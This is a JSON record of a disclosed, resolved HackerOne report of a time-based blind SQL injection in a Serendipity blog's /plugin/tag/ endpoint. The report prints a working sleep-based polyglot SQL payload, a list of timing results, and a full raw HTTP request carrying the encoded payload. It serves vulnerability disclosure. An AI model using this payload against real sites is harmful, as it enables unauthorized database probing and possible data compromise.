{
  "id": 374027,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzQwMjc=",
  "url": "https://hackerone.com/reports/374027",
  "title": "blind sql injection",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-06-29T20:39:25.675Z",
  "submitted_at": "2018-06-29T20:39:25.675Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "geeknik",
    "url": "/geeknik",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/7xfGZCKCxUuGLYGfuUZM3XyY/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 30278,
    "url": "https://hackerone.com/hannob",
    "handle": "hannob",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/030/278/97035f061f6de55a9362b39edae4f5948bda6735_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/030/278/97035f061f6de55a9362b39edae4f5948bda6735_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Hanno's projects",
      "twitter_handle": "hanno",
      "website": "https://hboeck.de/",
      "about": "Personal web projects from Hanno BÃ¶ck."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-11-09T21:02:58.104Z",
  "bug_reporter_agreed_on_going_public_at": "2018-11-09T21:02:58.066Z",
  "team_member_agreed_on_going_public_at": "2018-11-09T14:31:20.741Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** \nThere exists a possibility that your Serendipity installation is vulnerable to a blind sql injection.\n\n**Description:** \nBy sending specially crafted SQL commands to `/plugin/tag/` and timing how long it takes for the server to respond, it is quite possible that the blog backend is interepreting this as actual SQL commands and not just user input.\n\nFor example, if we visit `https://betterscience.org/plugin/tag/peerj` we get all articles tagged with `peerj`. I ran the following timed tests replacing `peerj` with the sql commands below:\n\n```\nif(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/ => 3.276 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.28 s\nif(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'\"XOR(if(now()=sysdate(),sleep(9),0))OR\"*/ => 9.298 s\nif(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ => 6.272 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.265 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.25 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.265 s\nif(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ => 6.256 s\nif(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/ => 0.437 s\n```\n\n## Steps To Reproduce:\n\nRequest:\n```\nGET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1\nX-Requested-With: XMLHttpRequest\nReferer: https://betterscience.org:443/\nCookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendipity[name]=dxctfnid; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22\nHost: betterscience.org\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept: */*\n\n```\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Impact\n\nWithout sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-12-09T14:31:20.797Z",
  "allow_singular_disclosure_after": -163463718.77998483,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "sameerphad72",
    "ali",
    "apapedulimu",
    "naategh",
    "geeknik",
    "eveeez",
    "sumit7",
    "zendered",
    "spetr0x",
    "ramster",
    "and 2 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 11141,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.betterscience.org",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
